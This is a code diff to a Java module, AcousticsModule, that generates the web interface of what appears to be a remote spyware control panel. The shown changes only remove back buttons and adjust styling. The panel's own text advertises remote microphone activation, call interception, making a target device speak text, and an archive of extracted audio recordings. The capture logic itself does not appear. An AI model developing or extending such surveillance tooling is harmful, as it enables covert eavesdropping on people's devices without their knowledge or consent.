@@ -296,10 +296,6 @@ public class AcousticsModule extends BaseModule {
             .append(".duration { font-size: 1.8rem; font-weight: 900; color: var(--neon-cyan); font-family: 'Orbitron', sans-serif; text-shadow: 0 0 10px rgba(0, 242, 255, 0.3); }")
             .append("</style>");
 
-        html.append("<div class=\"back-btn-container\">")
-            .append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>")
-            .append("</div>");
-
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">ACOUSTICS_INTERFACE <span class=\"info-trigger\" onclick=\"showInfo(event, 'ACOUSTICS_INTERFACE', 'Tactical acoustic surveillance hub for remote microphone activation and call interception.')\">INFO</span></h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
@@ -356,7 +352,7 @@ public class AcousticsModule extends BaseModule {
             .append("</div></div>");
 
         // --- VOICE EMISSION (TEXT-TO-SPEECH) SECTION (PLACED RIGHT BELOW AMBIENT_MIC) ---
-        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow); margin-top: 20px;\">");
+        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow);\">");
         html.append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-yellow);\">VOICE_EMISSION (TEXT-TO-SPEECH) <span class=\"info-trigger\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\" onclick=\"showInfo(event, 'VOICE_EMISSION', 'Remotely transmit text to be spoken out loud via the target device speakers using native TTS engine.')\">INFO</span></h2>");
         html.append("<div style=\"display: flex; flex-direction: column; gap: 15px; margin-top: 15px;\">");
         
@@ -590,9 +586,6 @@ public class AcousticsModule extends BaseModule {
     private Response serveAudioRecordings(IHTTPSession session) {
         FirebaseConfig.logActivity("ACOUSTICS_EXTRACT: Remote audio archive accessed");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
-        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px; font-size: 1.6rem;\">&#128190; Audio Recordings</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
